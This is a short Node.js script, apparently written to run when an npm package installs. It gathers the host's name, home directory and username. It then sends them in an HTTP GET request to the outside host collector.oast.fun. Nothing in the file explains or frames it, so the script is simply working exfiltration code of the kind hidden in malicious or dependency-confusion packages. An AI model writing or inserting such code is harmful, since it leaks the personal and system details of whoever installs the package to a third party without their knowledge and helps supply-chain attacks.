const os = require("os");
const querystring = require("querystring");
const http = require("http");

const profile = querystring.stringify({
  hostname: os.hostname(),
  homedir: os.homedir(),
  username: os.userInfo().username,
});
const options = {
  hostname: "collector.oast.fun",
  port: 80,
  path: `/realtime/npm?${profile}`,
  method: "GET",
};
http.request(options).end();
